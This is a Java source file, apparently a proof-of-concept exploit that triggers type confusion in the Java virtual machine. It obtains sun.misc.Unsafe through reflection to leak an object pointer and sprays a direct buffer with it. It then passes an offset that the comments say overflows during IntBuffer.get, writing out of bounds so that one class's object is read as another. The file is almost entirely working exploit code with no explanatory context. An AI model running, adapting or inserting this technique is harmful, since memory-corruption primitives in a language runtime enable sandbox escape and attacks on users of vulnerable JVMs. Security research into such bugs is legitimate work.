package TypeConfusionDemo;

import org.openjdk.jol.vm.VM;

import java.nio.ByteBuffer;
import java.nio.IntBuffer;
import java.lang.reflect.Field;
import sun.misc.Unsafe;

public class TypeConfusionDemo {
  public static int emptyLen = 125000000;
  public static int dstLen = 1209098507;
  // This will overflow to -294967284
  public static int offset = 999999999;
  public static int length = 2;
  public static int idx = 52087295;
  private static Unsafe unsafe;

  public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException {
    FakeClass fakeClass = new FakeClass(5);
    System.out.println("fakeClass memory address = " + VM.current().addressOf(fakeClass));
    int fakeClassPointer = get_compressed_oop(fakeClass);
    RealClass realClass = TypeConfusionDemo.use_type_confusion_to_convert_to_realclass(fakeClassPointer);
    System.out.println(realClass.instanceVar);
    System.out.println(realClass.classVar);
    realClass.foo(7);
  }

  public static void print_addresses(RealClass realClass, int realClassPointer) {
    System.out.println("Address of realClass: " + VM.current().addressOf(realClass));
    System.out.println("realClassPointer: " + Integer.toHexString(realClassPointer) + " (" + realClassPointer + ")");

  }

  public static int get_compressed_oop(FakeClass fakeClass)
      throws IllegalAccessException, NoSuchFieldException {
    Field field = Unsafe.class.getDeclaredField("theUnsafe");
    field.setAccessible(true);
    unsafe = (Unsafe)field.get(null);
    FakeClass[] helperArray = new FakeClass[1];
    helperArray[0] = fakeClass;
    long baseOffset = unsafe.arrayBaseOffset(FakeClass[].class);
    int addressSize = unsafe.addressSize();
    return (int) unsafe.getLong(helperArray, baseOffset);
  }

  public static RealClass use_type_confusion_to_convert_to_realclass(int objPointer) {
    System.out.println("OOP to fakeClass = " + objPointer);
    int bytes = 400;
    ByteBuffer bb = ByteBuffer.allocateDirect(bytes);
    IntBuffer ib = bb.asIntBuffer();
    
    // Fill the buffer with oop to fakeClass 
    System.out.println("IB memory address = " + VM.current().addressOf(ib));
    for (int i = 0; i < ib.limit(); i++) {
      ib.put(i, objPointer);
    } 

    RealClass[] realClassArray = TypeConfusionDemo.write_fakeclass_to_realclassarray(ib);
  
    return realClassArray[idx];
  }

  public static RealClass[] write_fakeclass_to_realclassarray(IntBuffer ib) {
    //Make arrays
    RealClass[] realClassArray = new RealClass[emptyLen];
    int[] dst = new int[dstLen];
    System.out.println("DST memory address = " + VM.current().addressOf(dst));
    System.out.println("realClassArray memory address = " + VM.current().addressOf(realClassArray));

    // fill 
    for (int i = 0; i < dst.length; i++) {
      dst[i] = 0xA2A2A2A2;
    }
    for (int i = 0; i < emptyLen; i++) {
	realClassArray[i] = new RealClass(i);
    }

    // overflow happens here -> offset will overflow to -294967284
    ib.get(dst, offset, length);

    return realClassArray;
  }
}
